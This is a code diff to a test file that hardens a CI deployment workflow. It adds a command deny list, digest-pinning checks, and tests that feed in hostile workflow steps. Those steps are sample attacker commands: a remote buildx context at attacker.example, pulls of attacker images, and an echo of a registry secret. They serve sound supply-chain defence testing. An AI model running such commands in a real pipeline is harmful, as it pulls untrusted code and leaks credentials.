@@ -41,6 +41,35 @@ function workflowCommands(workflow) {
 		.join('\n');
 }
 
+function assertDeployableCommandPolicy(workflow) {
+	const commandSteps = steps(workflow)
+		.filter((step) => typeof step.run === 'string')
+		.map((step) => ({ ...step, run: step.run.replace(/\\\r?\n[ \t]*/g, ' ') }));
+	const commands = commandSteps.map((step) => step.run).join('\n');
+	if ((commands.match(/\bdocker\s+build\b/gi) ?? []).length !== 1) {
+		throw new Error('forbidden deployable workflow command: expected one Docker build');
+	}
+
+	const forbidden = [
+		['Buildx', /\b(?:docker\s+)?buildx\b/i],
+		['Docker login or pull', /\bdocker\b[^\n;&|]*(?<![-\w])(?:login|pull)\b/i],
+		['Compose pull', /\b(?:docker(?:-|\s+)compose|compose)\b[^\n]*\bpull\b/i],
+		[
+			'remote Docker context',
+			/\bdocker\s+(?:build|buildx\s+build)\b[^\n]*(?:https?:\/\/|git:\/\/|ssh:\/\/|git@)/i
+		],
+		['GitHub expression', /\$\{\{/]
+	];
+
+	for (const step of commandSteps) {
+		for (const [name, pattern] of forbidden) {
+			if (pattern.test(step.run)) {
+				throw new Error(`forbidden deployable workflow command (${name}) in ${step.name ?? 'unnamed step'}`);
+			}
+		}
+	}
+}
+
 function gitIdentityStepIsBefore(workflow, writerStep) {
 	const identity = namedStep(workflow, 'Configure Tide-Bot automation identity');
 	assert.match(identity.run, /git config user\.name/);
@@ -237,6 +266,117 @@ test('deployable workflow only starts from trusted main push or explicit dispatc
 	assert.match(marker, /git push origin refs\/tags\/tide-bot-deployable --force/);
 	for (const line of marker.split('\n').filter((line) => line.includes('git push'))) {
 		assert.equal(line.trim(), 'git push origin refs/tags/tide-bot-deployable --force');
+	}
+});
+
+test('deployable workflow builds the fixed local Cypress runtime image before the gate', () => {
+	const buildImage = namedStep(deployable, 'Build local Tide-Bot runtime image');
+	assert.equal(
+		stepIndex(deployable, buildImage.name) + 1,
+		stepIndex(deployable, 'Run common update gate')
+	);
+	assert.equal(buildImage.shell, 'bash');
+	assert.deepEqual(buildImage.env, {
+		DOCKER_BUILDKIT: '0',
+		DOCKER_CONFIG: '/tmp/tide-bot-local-image-docker-config'
+	});
+	assert.deepEqual(buildImage.run.trimEnd().split('\n'), [
+		'set -euo pipefail',
+		'install -d -m 0700 "$DOCKER_CONFIG"',
+		'docker build \\',
+		'  --pull=false \\',
+		'  --build-arg USE_SLIM=true \\',
+		'  --tag tide-bot:local \\',
+		'  .'
+	]);
+	assert.equal((workflowCommands(deployable).match(/\bdocker\s+build\b/g) ?? []).length, 1);
+	assert.doesNotMatch(buildImage.run, /\bbuildx\b|https?:\/\/|git:\/\/|\$\{\{|\$INPUT_/i);
+});
+
+test('deployable workflow command policy accepts the tracked trusted commands', () => {
+	assertDeployableCommandPolicy(deployable);
+});
+
+test('deployable workflow command policy rejects malicious later-step mutations', () => {
+	const mutations = [
+		{
+			name: 'remote Buildx context',
+			run: 'docker buildx build https://attacker.example/context.git'
+		},
+		{
+			name: 'registry image pull',
+			run: 'docker image pull attacker/image:latest'
+		},
+		{
+			name: 'direct image pull',
+			run: 'docker pull attacker/image:latest'
+		},
+		{
+			name: 'Docker login after global config option',
+			run: 'docker --config /tmp/attacker login registry.example'
+		},
+		{
+			name: 'image pull after global context option',
+			run: 'docker --context attacker image pull attacker/image:latest'
+		},
+		{
+			name: 'continued Docker login after global config option',
+			run: 'docker --config /tmp/attacker \\\nlogin registry.example'
+		},
+		{
+			name: 'continued image pull after global context option',
+			run: 'docker --context attacker image \\\npull attacker/image'
+		},
+		{
+			name: 'continued Compose pull',
+			run: 'docker compose \\\npull'
+		},
+		{
+			name: 'Compose pull with options',
+			run: 'docker compose --file attacker.yml pull'
+		},
+		{
+			name: 'standalone Buildx invocation',
+			run: 'buildx version'
+		},
+		{
+			name: 'secret expression',
+			run: 'echo "${{ secrets.REGISTRY_TOKEN }}"'
+		}
+	];
+
+	for (const mutation of mutations) {
+		const broken = structuredClone(deployable);
+		broken.jobs['mark-deployable'].steps.push({ name: mutation.name, run: mutation.run });
+		assert.throws(
+			() => assertDeployableCommandPolicy(broken),
+			/forbidden deployable workflow command/,
+			mutation.name
+		);
+	}
+});
+
+test('marker runtime and companion fixture Dockerfiles pin every external image by digest', async () => {
+	const nodeImage =
+		'node:22-alpine3.20@sha256:2289fb1fba0f4633b08ec47b94a89c7e20b829fc5679f9b7b298eaa2f1ed8b7e';
+	const fixtureNodeImage =
+		'node:22-alpine@sha256:c610fcdfb1d5b4740dd70c284ed3cb16bb857e0f7166196e36a5501df7a3aa32';
+	const pythonImage =
+		'python:3.11-slim-bookworm@sha256:0bee7276f83efd4a1ee05bbbf4281d95ed28e079220a9457f25a93e3f1e3c31b';
+	const expected = new Map([
+		['Dockerfile', [`FROM --platform=$BUILDPLATFORM ${nodeImage} AS build`, `FROM ${pythonImage} AS base`]],
+		['deploy/tide-stack/cypress-fake-openai/Dockerfile', [`FROM ${fixtureNodeImage}`]],
+		['deploy/tide-stack/cypress-loopback-gateway/Dockerfile', [`FROM ${fixtureNodeImage}`]]
+	]);
+
+	for (const [relativePath, expectedFromLines] of expected) {
+		const source = await readFile(join(repoRoot, relativePath), 'utf8');
+		const fromLines = source.split(/\r?\n/).filter((line) => /^FROM\s/.test(line));
+		assert.deepEqual(fromLines, expectedFromLines, relativePath);
+		assert.ok(
+			fromLines.every((line) => /@sha256:[a-f0-9]{64}(?:\s|$)/.test(line)),
+			`${relativePath} contains a mutable external image`
+		);
 	}
 });
 
